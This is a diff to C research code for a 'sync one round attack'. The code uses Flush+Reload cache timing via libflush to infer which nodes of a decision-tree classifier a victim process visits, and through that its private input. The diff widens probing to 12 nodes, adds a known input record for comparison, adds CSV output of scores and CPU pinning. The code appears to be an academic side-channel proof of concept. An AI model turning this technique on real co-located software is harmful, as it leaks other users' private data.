@@ -1,7 +1,7 @@
 /**
  *	sync one round attack
  *
- *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com> Haehyun Cho <haehyun@asu.edu>
+ *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com>
 */
 
 #include "common.h"
@@ -30,6 +30,8 @@
  *
  * Assumption
  *   : Attacker already knows a structure of decision tree.
+ *
+ * Sample data-set, code are from http://id3alg.altervista.org/
  */
 
 int lib_fd;
@@ -45,8 +47,23 @@ const int cache_line_size = 64;
 uint64_t threshold = 300;
 libflush_session_t *session;
 
-unsigned int probe_idx[9] = {0, 6, 8, 2, 11, 3, 5, 4, 7,};
-unsigned int score[9] = {0,};
+unsigned int score[12] = {0,};
+
+#if 0 /* testset that server use */
+char *testset1[] = 
+{
+	/*
+	 * outlook, temperature, humidity, wind, play ball (class)
+	 */
+	"SUNNY", 	"MILD",  	"HIGH",    	"WEAK",		"NO",
+};
+#endif
+
+/* real input record from testset1 */
+/* SUNNY-->HIGH-->NO (class) */
+unsigned int real_input[12] = {
+	[0] = 1, [2] = 1, [3] = 1, [4] = 1, [9] = 1,
+};
 
 void map_lib(const char *path)
 {
@@ -173,6 +190,71 @@ static inline int reload_dec_tree_is_useful(U32 idx)
 struct shm_msg *client_msg;
 struct shm_msg *server_msg;
 
+void print_result_to_csv(void)
+{
+	FILE *fp = NULL;
+	char str[128] = {0,};
+	unsigned i;
+
+	fp = fopen("./result.csv", "w");
+	if (!fp) {
+		printf("fopen error\n");
+		return;
+	}
+
+	snprintf(str, 128, "test count,%d\n", test_count);
+	fwrite(str, 1, strlen(str), fp);
+	
+	fwrite("cache result\n", 1, strlen("cache result\n"), fp);
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "%s\n", dec_tree_infolist[i].name);
+		else
+			snprintf(str, 128, "%s,", dec_tree_infolist[i].name);
+		fwrite(str, 1, strlen(str), fp);
+	}
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(dec_tree + i));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(dec_tree + i));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "%d\n", score[i]);
+		else
+			snprintf(str, 128, "%d,", score[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fwrite("\nreal input record\n", 1, strlen("\nreal input record\n"), fp);
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "%s\n", dec_tree_infolist[i].name);
+		else
+			snprintf(str, 128, "%s,", dec_tree_infolist[i].name);
+		fwrite(str, 1, strlen(str), fp);
+	}
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(dec_tree + i));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(dec_tree + i));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	for (i=0; i<12; i++) {
+		if (i == 11)
+			snprintf(str, 128, "%d\n", real_input[i]);
+		else
+			snprintf(str, 128, "%d,", real_input[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fclose(fp);
+}
+
+
 void do_test_dec_tree(void)
 {
 	U32 j;
@@ -203,30 +285,47 @@ void do_attack(void)
 	int ret;
 
 	for(i=0; i<test_count; i++) {
-		for(j=0; j<9; j++) {
-			idx = probe_idx[j];
+		for(j=0; j<12; j++) {
+			//idx = probe_idx[j];
 
 			/* flush */
-			flush_dec_tree(idx);
+			flush_dec_tree(j);
 
 			/* operation */
 			do_test_dec_tree();
 
 			/* reload */
-			ret = reload_dec_tree_is_useful(idx);
+			ret = reload_dec_tree_is_useful(j);
 			if(ret)
 				score[j] += 1;
 		}
 	}
 }
 
+void bind_cpu(int cpuid)
+{
+    unsigned long mask = 0;
+
+    if(cpuid == 0) mask = 1;
+    else if(cpuid == 1) mask = 2;
+    else if(cpuid == 2) mask = 4;
+    else if(cpuid == 3) mask = 8;
+
+    if(sched_setaffinity(0, sizeof(mask), (cpu_set_t*)&mask) < 0)
+    {
+        printf("sched_setaffinity error\n");
+        return;
+    }
+}
+
 void print_result(void)
 {
 	unsigned int i;
 
-	for(i=0; i<9; i++) {
-		printf("Node [%d,%s] - Score : %d\n", probe_idx[i], dec_tree_infolist[i].name, score[i]);
+	for(i=0; i<12; i++) {
+		printf("Node [%d,%s] - Score : %d\n", i, dec_tree_infolist[i].name, score[i]);
 	}
+	print_result_to_csv();
 }
 
 void init_libflush(void)
@@ -259,6 +358,7 @@ int main(int argc, char **argv)
 	/* init */
 	get_args(argc, argv);
 	init_libflush();
+	bind_cpu(1);
 
 	/* get shm */
 	if((fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
